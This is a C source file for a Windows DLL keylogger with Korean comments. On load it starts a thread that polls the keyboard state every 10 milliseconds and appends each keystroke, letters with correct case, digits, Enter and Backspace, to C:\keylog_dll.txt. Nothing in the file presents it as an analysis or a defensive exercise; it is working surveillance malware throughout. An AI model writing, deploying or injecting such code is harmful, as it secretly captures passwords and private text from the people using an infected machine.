#include <windows.h>
#include <stdio.h>

#define LOG_FILE "C:\\keylog_dll.txt"

HANDLE hThread;
BOOL running = TRUE;

void LogKey(int vkCode) {
    FILE *logFile = fopen(LOG_FILE, "a");
    if (!logFile) return;
    
    if (vkCode == VK_RETURN) fprintf(logFile, "[ENTER]\n");
    else if (vkCode == VK_SPACE) fprintf(logFile, " ");
    else if (vkCode == VK_BACK) fprintf(logFile, "[BACK]");
    else if (vkCode >= 0x30 && vkCode <= 0x39) { // 0-9
        fprintf(logFile, "%c", vkCode);
    }
    else if (vkCode >= 0x41 && vkCode <= 0x5A) { // A-Z
        BOOL shift = GetAsyncKeyState(VK_SHIFT) & 0x8000;
        BOOL caps = GetKeyState(VK_CAPITAL) & 0x0001;
        char c = vkCode;
        if (!(shift ^ caps)) c += 32; // 소문자
        fprintf(logFile, "%c", c);
    }
    
    fflush(logFile);
    fclose(logFile);
}

DWORD WINAPI PollingThread(LPVOID lpParam) {
    FILE *logFile = fopen(LOG_FILE, "a");
    if (logFile) {
        fprintf(logFile, "\n=== Polling Keylogger Started ===\n");
        fclose(logFile);
    }
    
    BOOL keyStates[256] = {0};
    
    while (running) {
        for (int vk = 8; vk < 256; vk++) {
            SHORT state = GetAsyncKeyState(vk);
            
            // 키가 새로 눌렸는지 확인
            if ((state & 0x8000) && !keyStates[vk]) {
                keyStates[vk] = TRUE;
                LogKey(vk);
            }
            else if (!(state & 0x8000)) {
                keyStates[vk] = FALSE;
            }
        }
        Sleep(10); // 10ms마다 체크
    }
    
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    switch(dwReason) {
        case DLL_PROCESS_ATTACH:
            hThread = CreateThread(NULL, 0, PollingThread, NULL, 0, NULL);
            break;
        case DLL_PROCESS_DETACH:
            running = FALSE;
            if (hThread) {
                WaitForSingleObject(hThread, 1000);
                CloseHandle(hThread);
            }
            break;
    }
    return TRUE;
}
